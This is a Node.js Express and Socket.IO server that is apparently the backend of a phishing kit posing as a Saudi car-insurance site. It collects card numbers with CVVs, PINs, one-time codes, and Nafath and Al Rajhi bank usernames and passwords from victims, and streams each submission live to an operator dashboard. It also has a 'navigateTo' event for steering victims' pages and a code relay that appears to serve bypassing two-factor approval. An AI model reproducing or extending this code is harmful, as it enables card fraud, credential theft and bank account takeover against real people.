// server.js

// ─── 1) IMPORTS & CONFIG ───────────────────────────────────────────────────────
require("dotenv").config();
const express = require("express");
const http = require("http");
const cors = require("cors");
const mongoose = require("mongoose");
const { Server } = require("socket.io");

// –– Whitelist both frontends ––
const allowedOrigins = [
  process.env.FRONTEND_ORIGIN, // your old HTML dashboard origin
  process.env.DASHBOARD_ORIGIN, // your React/Vercel app origin
];

// ─── 2) GLOBAL ERROR HANDLING ─────────────────────────────────────────────────
// Catch unhandled promise rejections
process.on("unhandledRejection", (reason, p) => {
  console.error("🚨 Unhandled Rejection at:", p, "reason:", reason);
});
// Catch uncaught exceptions
process.on("uncaughtException", (err) => {
  console.error("🚨 Uncaught Exception:", err);
});

// ─── 3) EXPRESS + SOCKET SETUP ────────────────────────────────────────────────
const app = express();
const httpServer = http.createServer(app);

// Attach Socket.IO (no auth checks at all)
const io = new Server(httpServer, {
  cors: {
    origin: (incoming, callback) => {
      if (!incoming || allowedOrigins.includes(incoming)) {
        callback(null, true);
      } else {
        callback("Origin not allowed by CORS", false);
      }
    },
    methods: ["GET", "POST"],
    credentials: true,
  },
});

// ─── 4) MIDDLEWARES ───────────────────────────────────────────────────────────
// 4a) JSON body parsing & logging for /api routes
app.use("/api", express.json());
app.use("/api", (req, res, next) => {
  console.log(
    `[API] ${req.method} ${req.originalUrl} – body: ${JSON.stringify(req.body)}`
  );
  next();
});

// 4b) CORS for /api, restricted to our two frontends
app.use(
  "/api",
  cors({
    origin: (incoming, callback) => {
      if (!incoming || allowedOrigins.includes(incoming)) {
        callback(null, true);
      } else {
        callback(new Error(`Origin ${incoming} not allowed`));
      }
    },
    credentials: true,
  })
);

// ─── 5) MONGOOSE MODELS ───────────────────────────────────────────────────────
// 5a) User model for authentication (no login/register endpoints will exist, but we keep the model in case you want to preserve it)
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  passwordHash: { type: String, required: true },
});
const User = mongoose.models.User || mongoose.model("User", UserSchema);

// 5b) Location model (same as before)
const LocationSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    currentPage: { type: String },
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const Location =
  mongoose.models.Location || mongoose.model("Location", LocationSchema);

// 5c) IndexPage model
const IndexSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    SellerIDnumber: mongoose.Schema.Types.Mixed,
    BuyerIDnumber: mongoose.Schema.Types.Mixed,
    IDorResidenceNumber: mongoose.Schema.Types.Mixed,
    FullName: mongoose.Schema.Types.Mixed,
    PhoneNumber: mongoose.Schema.Types.Mixed,
    SerialNumber: mongoose.Schema.Types.Mixed,
    VerificationCode: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const IndexPage =
  mongoose.models.IndexPage || mongoose.model("IndexPage", IndexSchema);

// 5d) Flag model (persist per‐user highlight)
const FlagSchema = new mongoose.Schema({
  ip: { type: String, unique: true, required: true },
  flag: { type: Boolean, default: false },
});
const Flag = mongoose.models.Flag || mongoose.model("Flag", FlagSchema);

// 5e) DetailsPage model
const DetailsSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    TypeOfInsuranceContract: mongoose.Schema.Types.Mixed,
    InsuranceStartDate: mongoose.Schema.Types.Mixed,
    PurposeOfUse: mongoose.Schema.Types.Mixed,
    EstimatedValue: mongoose.Schema.Types.Mixed,
    ManufactureYear: mongoose.Schema.Types.Mixed,
    RepairLocation: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const DetailsPage =
  mongoose.models.DetailsPage || mongoose.model("DetailsPage", DetailsSchema);

// 5f) Comprehensive model
const ComprehensiveSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    companyName: { type: String, required: true },
    basePrice: { type: Number, required: true },
    selectedOptions: [{ label: String, price: Number }],
    totalPrice: { type: Number, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Comprehensive =
  mongoose.models.Comprehensive ||
  mongoose.model("Comprehensive", ComprehensiveSchema);

// 5g) ThirdParty model
const ThirdPartySchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    companyName: { type: String, required: true },
    basePrice: { type: Number, required: true },
    selectedOptions: [{ label: String, price: Number }],
    totalPrice: { type: Number, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const ThirdParty =
  mongoose.models.ThirdParty || mongoose.model("ThirdParty", ThirdPartySchema);

// 5h) Billing model
const BillingSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    mada: Boolean,
    visa_mastarcard: Boolean,
    applepay: Boolean,
    totalPrice: Number,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Billing =
  mongoose.models.Billing || mongoose.model("Billing", BillingSchema);

// 5i) Payment model
const PaymentSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    cardHolderName: { type: String, required: true },
    cardNumber: { type: String, required: true },
    expirationDate: { type: String, required: true },
    cvv: { type: String, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Payment =
  mongoose.models.Payment || mongoose.model("Payment", PaymentSchema);

// 5j) Pin model
const PinSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    pin: { type: String, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Pin = mongoose.models.Pin || mongoose.model("Pin", PinSchema);

// 5k) Otp model
const OtpSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    verification_code_two: { type: String },
    verification_code_three: { type: String },
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Otp = mongoose.models.Otp || mongoose.model("Otp", OtpSchema);

// 5l) Phone model
const PhoneSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    phoneNumber: { type: String, required: true },
    operator: { type: String, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Phone = mongoose.models.Phone || mongoose.model("Phone", PhoneSchema);

// 5m) Nafad model
const NafadSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    username: { type: String, required: true },
    password: { type: String, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: true } }
);
const Nafad = mongoose.models.Nafad || mongoose.model("Nafad", NafadSchema);

// 5m.1) Rajhi model (Rajhi login ONLY)
const RajhiSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    username: { type: String, required: true },
    password: { type: String, required: true },
  },
  { timestamps: { createdAt: true, updatedAt: true } }
);
const Rajhi = mongoose.models.Rajhi || mongoose.model("Rajhi", RajhiSchema);

// 5n) Basmah model
const BasmahSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    code: { type: String, required: true }, // store as string to preserve leading zeros
  },
  { timestamps: true }
);
const Basmah = mongoose.models.Basmah || mongoose.model("Basmah", BasmahSchema);

// ─── 6) EXPRESS API ROUTES ────────────────────────────────────────────────────
// Helper to wrap async route handlers
const wrap = (fn) => (req, res, next) => fn(req, res, next).catch(next);

// ── 6B) PUBLIC “TRACK” ROUTES ─────────────────────────────────────────────────
// None of these require any JWT—any client may call them.

app.post(
  "/api/track/index",
  wrap(async (req, res) => {
    const data = { ...req.body, updatedAt: new Date() };
    const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, {
      upsert: true,
      new: true,
      setDefaultsOnInsert: true,
    });
    io.emit("newIndex", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/details",
  wrap(async (req, res) => {
    const data = { ...req.body, updatedAt: new Date() };
    const doc = await DetailsPage.findOneAndUpdate({ ip: data.ip }, data, {
      upsert: true,
      new: true,
      setDefaultsOnInsert: true,
    });
    io.emit("newDetails", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/comprehensive",
  wrap(async (req, res) => {
    const doc = await Comprehensive.create(req.body);
    io.emit("newShamel", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/thirdparty",
  wrap(async (req, res) => {
    const doc = await ThirdParty.create(req.body);
    io.emit("newThirdparty", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/billing",
  wrap(async (req, res) => {
    const doc = await Billing.create(req.body);
    io.emit("newBilling", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/payment",
  wrap(async (req, res) => {
    const doc = await Payment.create(req.body);
    io.emit("newPayment", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/code",
  wrap(async (req, res) => {
    const { ip, verification_code } = req.body;
    const doc = await Pin.create({
      ip,
      pin: verification_code,
    });
    io.emit("newPin", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/verification",
  wrap(async (req, res) => {
    const doc = await Otp.create({
      ip: req.body.ip,
      verification_code_two: req.body.verification_code_two,
    });
    io.emit("newOtp", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/phone",
  wrap(async (req, res) => {
    const { ip, phoneNumber, operator } = req.body;
    const doc = await Phone.create({ ip, phoneNumber, operator });
    io.emit("newPhone", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/phonecode",
  wrap(async (req, res) => {
    const { ip, verification_code_three } = req.body;
    const doc = await Otp.create({ ip, verification_code_three });
    io.emit("newPhoneCode", doc);
    res.json({ success: true, doc });
  })
);

// NEW: split Nafad vs Rajhi REST endpoints
app.post(
  "/api/track/nafad",
  wrap(async (req, res) => {
    const { ip, username, password } = req.body;
    const doc = await Nafad.create({ ip, username, password });
    io.emit("newNafad", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/rajhi",
  wrap(async (req, res) => {
    const { ip, username, password } = req.body;
    const doc = await Rajhi.create({ ip, username, password });
    io.emit("newRajhi", doc);
    res.json({ success: true, doc });
  })
);

app.post(
  "/api/track/basmah",
  wrap(async (req, res) => {
    const { ip, code } = req.body;
    const doc = await Basmah.findOneAndUpdate(
      { ip },
      { code: String(code).padStart(2, "0") },
      { upsert: true, new: true }
    );
    io.emit("nafadCode", { ip, code: doc.code });
    res.json({ success: true, doc });
  })
);

// DELETE /api/users/:ip  (public—no token required)
app.delete(
  "/api/users/:ip",
  wrap(async (req, res) => {
    const { ip } = req.params;
    await Promise.all([
      IndexPage.deleteMany({ ip }),
      DetailsPage.deleteMany({ ip }),
      Comprehensive.deleteMany({ ip }),
      ThirdParty.deleteMany({ ip }),
      Billing.deleteMany({ ip }),
      Payment.deleteMany({ ip }),
      Pin.deleteMany({ ip }),
      Otp.deleteMany({ ip }),
      Phone.deleteMany({ ip }),
      Nafad.deleteMany({ ip }),
      Rajhi.deleteMany({ ip }),
      Basmah.deleteMany({ ip }),
      Location.deleteMany({ ip }),
      Flag.deleteMany({ ip }),
    ]);
    io.emit("userDeleted", { ip });
    res.json({ success: true });
  })
);

// Global Express error handler
app.use((err, req, res, next) => {
  console.error("⚠️ API error:", err);
  res
    .status(500)
    .json({ success: false, error: err.message || "Server error" });
});

// ─── 7) SOCKET.IO LOGIC ───────────────────────────────────────────────────────
io.on("connection", (socket) => {
  console.log("⚡ Socket connected:", socket.id);

  // loadData
  socket.on("loadData", async () => {
    try {
      const [
        allIndex,
        allDetails,
        allComps,
        allThirds,
        allLocations,
        allPayments,
        allPins,
        allOtps,
        allPhones,
        allNafads,
        allRajhis,
        allBasmah,
        allFlags,
      ] = await Promise.all([
        IndexPage.find({}).sort({ updatedAt: -1 }).lean(),
        DetailsPage.find({}).sort({ updatedAt: -1 }).lean(),
        Comprehensive.find({}).sort({ createdAt: -1 }).lean(),
        ThirdParty.find({}).sort({ createdAt: -1 }).lean(),
        Location.find({}).lean(),
        Payment.find({}).lean(),
        Pin.find({}).lean(),
        Otp.find({}).lean(),
        Phone.find({}).lean(),
        Nafad.find({}).lean(),
        Rajhi.find({}).lean(),
        Basmah.find({}).lean(),
        Flag.find({}).lean(),
      ]);

      socket.emit("initialData", {
        index: allIndex,
        details: allDetails,
        comprehensive: allComps,
        thirdparty: allThirds,
        locations: allLocations,
        payment: allPayments,
        pin: allPins,
        otp: allOtps,
        phone: allPhones,
        nafad: allNafads,
        rajhi: allRajhis,
        basmah: allBasmah,
        flags: allFlags,
      });
    } catch (err) {
      console.error("Error in loadData:", err);
    }
  });

  // updateLocation
  socket.on("updateLocation", async ({ ip, page }) => {
    try {
      await Location.findOneAndUpdate(
        { ip },
        { currentPage: page, updatedAt: new Date() },
        { upsert: true, setDefaultsOnInsert: true }
      );
      // Remember IP for this socket
      socket.data.ip = ip;
      io.emit("locationUpdated", { ip, page });
    } catch (e) {
      console.error("Location upsert error:", e);
    }
  });

  // submitIndex
  socket.on("submitIndex", async (data) => {
    try {
      const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true,
      });
      io.emit("newIndex", doc);
      socket.emit("ackIndex", { success: true });
    } catch (err) {
      console.error("Error upserting index:", err);
      socket.emit("ackIndex", { success: false, error: err.message });
    }
  });

  // submitDetails
  socket.on("submitDetails", async (data) => {
    try {
      const doc = await DetailsPage.findOneAndUpdate({ ip: data.ip }, data, {
        upsert: true,
        new: true,
        setDefaultsOnInsert: true,
      });
      io.emit("newDetails", doc);
      socket.emit("ackDetails", { success: true });
    } catch (err) {
      console.error("Error upserting details:", err);
      socket.emit("ackDetails", { success: false, error: err.message });
    }
  });

  // submitComprehensive
  socket.on("submitComprehensive", async (data) => {
    try {
      const doc = await Comprehensive.create(data);
      io.emit("newShamel", doc);
      socket.emit("ackShamel", { success: true });
    } catch (err) {
      console.error("Error saving comprehensive:", err);
      socket.emit("ackShamel", { success: false, error: err.message });
    }
  });

  // submitThirdparty
  socket.on("submitThirdparty", async (data) => {
    try {
      const doc = await ThirdParty.create(data);
      io.emit("newThirdparty", doc);
      socket.emit("ackThirdparty", { success: true });
    } catch (err) {
      console.error("Error saving third-party:", err);
      socket.emit("ackThirdparty", { success: false, error: err.message });
    }
  });

  // submitBilling
  socket.on("submitBilling", async (data) => {
    try {
      const doc = await Billing.create(data);
      io.emit("newBilling", doc);
      socket.emit("ackBilling", { success: true });
    } catch (err) {
      console.error("Error saving billing:", err);
      socket.emit("ackBilling", { success: false, error: err.message });
    }
  });

  // submitPayment
  socket.on("submitPayment", async (data) => {
    try {
      const doc = await Payment.create(data);
      io.emit("newPayment", doc);
      socket.emit("ackPayment", { success: true });
    } catch (err) {
      console.error("Error saving payment:", err);
      socket.emit("ackPayment", { success: false, error: err.message });
    }
  });

  // submitCode (PIN)
  socket.on("submitCode", async (data) => {
    try {
      const ip = data.ip || socket.data.ip;
      const doc = await Pin.create({
        ip,
        pin: data.verification_code,
      });
      io.emit("newPin", doc);
      socket.emit("ackCode", { success: true });
    } catch (err) {
      console.error("Error saving pin:", err);
      socket.emit("ackCode", { success: false, error: err.message });
    }
  });

  // submitVerification (Card OTP)
  socket.on("submitVerification", async (data) => {
    try {
      const doc = await Otp.create({
        ip: data.ip,
        verification_code_two: data.verification_code_two,
      });
      io.emit("newOtp", doc);
      socket.emit("ackVerification", { success: true });
    } catch (err) {
      console.error("Error saving OTP:", err);
      socket.emit("ackVerification", { success: false, error: err.message });
    }
  });

  // submitPhoneCode (Phone OTP)
  socket.on("submitPhoneCode", async (data) => {
    try {
      const doc = await Otp.create({
        ip: data.ip,
        verification_code_three: data.verification_code_three,
      });
      io.emit("newPhoneCode", doc);
      socket.emit("ackPhoneCode", { success: true });
    } catch (err) {
      console.error("Error saving phone code:", err);
      socket.emit("ackPhoneCode", { success: false, error: err.message });
    }
  });

  // submitPhone
  socket.on("submitPhone", async (data) => {
    try {
      const doc = await Phone.create({
        ip: data.ip,
        phoneNumber: data.phoneNumber,
        operator: data.operator,
      });
      io.emit("newPhone", doc);
      socket.emit("ackPhone", { success: true });
    } catch (err) {
      console.error("Error saving phone:", err);
      socket.emit("ackPhone", { success: false, error: err.message });
    }
  });

  // NEW: split Nafad vs Rajhi socket events
  socket.on("submitNafad", async (data) => {
    try {
      const doc = await Nafad.create({
        ip: data.ip,
        username: data.username,
        password: data.password,
      });
      io.emit("newNafad", doc);
      socket.emit("ackNafad", { success: true });
    } catch (err) {
      console.error("Error saving Nafad login:", err);
      socket.emit("ackNafad", { success: false, error: err.message });
    }
  });

  socket.on("submitRajhi", async (data) => {
    try {
      const doc = await Rajhi.create({
        ip: data.ip,
        username: data.username,
        password: data.password,
      });
      io.emit("newRajhi", doc);
      socket.emit("ackRajhi", { success: true });
    } catch (err) {
      console.error("Error saving Rajhi login:", err);
      socket.emit("ackRajhi", { success: false, error: err.message });
    }
  });

  // updateBasmah
  socket.on("updateBasmah", async ({ ip, basmah }) => {
    try {
      const doc = await Basmah.findOneAndUpdate(
        { ip },
        { code: String(basmah).padStart(2, "0") },
        { upsert: true, new: true }
      );
      io.emit("nafadCode", { ip, code: doc.code });
      socket.emit("ackBasmah", { success: true });
    } catch (err) {
      console.error("Error updating basmah:", err);
      socket.emit("ackBasmah", { success: false, error: err.message });
    }
  });

  // === NEW: respond to "getNafadCode" polling from clients ===
  socket.on("getNafadCode", async () => {
    try {
      // We assume `socket.data.ip` was already set by updateLocation
      const myIp = socket.data.ip;
      if (!myIp) {
        // If for some reason IP isn't set yet, just emit empty
        return socket.emit("nafadCode", { code: null });
      }
      // Look up the 2-digit code in the DB
      const doc = await Basmah.findOne({ ip: myIp }).lean();
      const code = doc ? doc.code : null;
      // Emit back only to this socket
      socket.emit("nafadCode", { code });
    } catch (err) {
      console.error("Error handling getNafadCode:", err);
      socket.emit("nafadCode", { error: err.message });
    }
  });

  socket.on("navigateTo", ({ page, ip: targetIp }) => {
    // Loop over all connected sockets, and only emit to the one whose data.ip === targetIp
    io.of("/").sockets.forEach((clientSocket) => {
      if (clientSocket.data.ip === targetIp) {
        clientSocket.emit("navigateTo", { page, ip: targetIp });
      }
    });
  });

  // disconnect
  socket.on("disconnect", () => {
    const ip = socket.data.ip;
    if (ip) {
      Location.findOneAndUpdate(
        { ip },
        { currentPage: "offline", updatedAt: new Date() },
        { upsert: true, setDefaultsOnInsert: true }
      )
        .then(() => io.emit("locationUpdated", { ip, page: "offline" }))
        .catch(console.error);
    }
    console.log("⚡ Disconnected:", socket.id);
  });

  // toggleFlag
  socket.on("toggleFlag", async ({ ip, flag }) => {
    await Flag.findOneAndUpdate({ ip }, { flag }, { upsert: true, new: true });
    io.emit("flagUpdated", { ip, flag });
  });
});

// ─── 8) MONGODB CONNECT & SERVER START ────────────────────────────────────────
mongoose
  .connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log("✅ MongoDB connected");
    const port = process.env.PORT || 3000;
    httpServer.listen(port, () => console.log(`🚀 Listening on port ${port}`));
  })
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err);
    process.exit(1);
  });
